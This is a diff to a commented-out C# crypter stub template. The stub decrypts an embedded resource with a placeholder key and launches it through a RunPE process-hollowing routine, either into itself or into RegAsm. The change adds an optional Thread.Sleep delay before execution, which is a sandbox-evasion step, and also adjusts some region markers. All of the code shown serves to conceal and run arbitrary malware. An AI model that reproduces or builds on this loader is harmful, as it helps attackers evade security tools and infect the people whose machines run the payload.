@@ -7,6 +7,8 @@
 ////#define ITSELF
 ////#define REGASM
 
+////#define SLEEP
+
 //using System;
 //using System.ComponentModel;
 //using System.Diagnostics;
@@ -47,6 +49,10 @@
 //#endif
 //            byte[] bytes = GetResource("[RES]");
 //            byte[] array = Decrypt(bytes, "[KEY]");
+
+//#if SLEEP
+//            Thread.Sleep([SLEEP]);
+//#endif
 
 //#if ITSELF
 //            RunPE.Run(Application.ExecutablePath, array, false);
@@ -267,7 +273,7 @@
 
 //#endif
 //    }
-//    #region RunPE Class
+//#region RunPE Class
 //    public static class RunPE
 //    {
 //        //github.com/Artiist/RunPE-Process-Protection/blob/master/RunPE.cs
@@ -463,5 +469,5 @@
 //        }
 //    }
 
-//    #endregion
+//#endregion
 //}
